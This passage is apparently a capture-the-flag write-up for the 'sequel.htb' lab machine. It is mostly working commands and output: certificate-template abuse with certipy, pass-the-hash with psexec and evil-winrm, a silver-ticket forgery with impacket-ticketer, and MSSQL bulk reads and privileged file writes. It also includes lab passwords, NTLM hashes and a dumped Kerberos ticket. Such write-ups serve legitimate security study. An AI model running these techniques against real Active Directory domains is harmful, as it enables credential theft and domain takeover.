      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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  SEQUEL.HTB
  StartTime                :  4/9/2025 4:46:07 PM
  EndTime                  :  4/10/2025 2:46:07 AM
  RenewTill                :  4/16/2025 4:46:07 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  j8x2JfQV+QSzCMugRhIC1g==
  ASREP (key)              :  D41818C9A7510B0DE7C4AF1DBC5C1EAB

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
```
### Method 1b (Certipy, through our Kali only)
- Alternate method: using certipy
	- https://github.com/ly4k/Certipy
		```bash
pipx install certipy-ad
```
	- Find vulnerable template using certipy:
		```bash
certipy find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable

---OUTPUT---
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
```
	- Get the psx file:
		```bash
certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-DC-CA -template UserAuthentication

# Didn't work first time so I passed
certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-DC-CA -template UserAuthentication -debug

#After this it worked even without the debug command

---OUTPUT---
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 17
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```
	- Get hash:
		```bash
certipy auth -pfc administrator.pfc

---OUTPUT-FAIL---
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
		- It doesn't work. If we remember in our nmap, we found there was a time skew of about 8 hours  between our target machine and ours.
			- So we need to sync the times (we use ntpdate):
				```bash
sudo apt install ntpdate
sudo ntpdate 10.10.11.202
```
	- We pass our command again, with the time synced:
		```bash
certipy auth -pfc administrator.pfc

---OUTPUT---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```
		- We get the hash : `a52f78e4c751e5f5e17e1e9f3e58f4ee`
			- First part before the : is LM hash which is not used
- Evil winrm with pass-the-hash technique
	```bash
---test---
crackmapexec smb 10.10.11.202 -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE

--ACCESS--
psexec -hashes A52F78E4C751E5F5E17E1E9F3E58F4EE:A52F78E4C751E5F5E17E1E9F3E58F4EE administrator@10.10.11.102

OR

evil-winrm -i sequel.htb -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
```
### Method 2 (Silver Ticket Attack, harder)
- Basic Kerberos ticket functioning:
	![[Pasted image 20250409215217.png]]
	- As we can see most communication is between client and DC, only authentication with server. The server never really communicates with DC for this.
	- Basically we request a TGT from DC. DC signs it and gives TGT (encrypted with KRBTGT of the domain) to client. 
		- The clients don't know this KRBTGT hash so they can't use this ticket as it's signed with a secret they don't know
			- Can only use it with DC as it has the secrets.
	- So we give DC the TGT (TG Request) and it sends back a TGS Ticket saying we can talk to it.
		- We say we wanna talk to MSSQL
		- DC looks at the TGT and says yes we can (forged? golden ticket)
	- When DC gives the TGS ticket back, it will encrypt it with the password hash that MSSQL is using.
		- If not a service, it will use the machine accounts password hash with changes every 30 days.
			- this is the secret that protects all of kerberos
	- So when MSSQL gets this, it implicitly trusts it as it thinks we have no way to know what this signing key for this ticket is, so it must've come from the domain controller.
- In context of our attack, we need to get the following (NTLM and Domain SID steps after table)

| Type       | Content                                   |
| ---------- | ----------------------------------------- |
| Username   | sql_svc                                   |
| Password   | REGGIE1234ronnie                          |
| NTLM       | 1443ec19da4dac4ffc953bca1b57b4cf          |
| Domain SID | S-1-5-21-4078382237-1492182817-2568127209 |

- We generate NTLM hash from our sql_svc MSSQL credentials
	```bash
python

Python 3.13.2 (main, Feb  5 2025, 01:23:35) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import hashlib
>>> hashlib.new('MD4','REGGIE1234ronnie'.encode('UTF-16LE'))
<md4 _hashlib.HASH object @ 0x7fd929b91990>
>>> hashlib.new('MD4','REGGIE1234ronnie'.encode('UTF-16LE')).digest()
b'\x14C\xec\x19\xdaM\xacO\xfc\x95;\xca\x1bW\xb4\xcf'
>>> hashlib.new('MD4','REGGIE1234ronnie'.encode('UTF-16LE')).digest().hex()
'1443ec19da4dac4ffc953bca1b57b4cf'
>>> 
```
	- NTLM is MD4 so we just need to encode it in UTF-16LE for windows
- Find SID:
	- Powershell into the machine (evil-winrm) and:
		```powershell
get-addomain

---OUTPUT---
DomainSID                          : S-1-5-21-4078382237-1492182817-2568127209
```
- Pass exploit using ticketer:
	```bash
impacket-ticketer -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -spn rocknrj/dc.sequel.htb administrator

---OUTPUT---
[*] Creating basic skeleton ticket and PAC Infos
/usr/share/doc/python3-impacket/examples/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  aTime = timegm(datetime.datetime.utcnow().timetuple())
[*] Customizing ticket for sequel.htb/administrator
/usr/share/doc/python3-impacket/examples/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))
/usr/share/doc/python3-impacket/examples/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
/usr/share/doc/python3-impacket/examples/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
/usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache
```
	- I tried dc.sequel.htb and just sequel.htb and both worked (both are in my /etc/hosts)
- Gain Admin privilege in MSSQL:
	```bash
KRB5CCNAME=administrator.ccache impacket-mssqlclient -k -nopass administrator@dc.sequel.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

---OUTPUT---
*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sequel\Administrator  dbo@master)>
```
	- Try to execute xp_cmdshell to gain root shell access:
		```bash
SQL (sequel\Administrator  dbo@master)> xp_cmdshell

---OUTPUT---
ERROR(DC\SQLMOCK): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```
		- xp_cmdshell isprobably running create process and doesn't have the impersonation flag or because our account doesn't have impersonation privileges, it fails to switch to our admin user.
			- But if we don't use create processes but just make underlying file system calls, it should allow us to act as the user we want.
- On searching online I find :
	- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#xp_cmdshell
		- Under MSSQL File Manipulation we pass the command to try and read root file:
			```bash
> select x from OpenRowset(BULK 'C:\Users\Administrator\Desktop\root.txt',SINGLE_CLOB) R(x)


---OUTPUT---
x                                         
---------------------------------------   
b'8f3e86a83252edf71aec0e895dc64bf5\r\n'
```
- Note since we said earlier about how if we make underlying file system calls, it should allow us to act as the user we want, we can also try writing if we want and use that as an entry point.
	- Can check PayloadsAllTheThings > EoP Privileged File Write
		- can see if any unpatched stuff is there to exploit
	- https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql
		- We try to execute this (has to be in two line so can't copy and paste the whole thing.)
			```sql

create table #errortable (ignore int)
bulk insert #errortable from '\\localhost\c$\windows\win.ini' with ( fieldterminator=',', rowterminator='\n', errorfile='c:\windows\temp\thatjusthappend.txt')
drop table #errortable
```
			- Better to avoid temp folder as it may not exist
		- On checking the temp folder we find the file:
			```bash
cd \Windows\Temp
dir

---OUTPUT---
-a----         4/9/2025   7:39 PM             92 thatjusthappend.txt
-a----         4/9/2025   7:39 PM            439 thatjusthappend.txt.Error.Txt
```
			- Check the owner:
				```bash
get-acl thatjusthappend.txt

---OUTPUT---
    Directory: C:\Windows\Temp


Path                Owner                  Access
----                -----                  ------
thatjusthappend.txt BUILTIN\Administrators BUILTIN\Administrators Allow  FullControl...
```
				- So we do have an elevated file write with this server ticket
					- can find a way to escalate privileges like this if we want.
------
------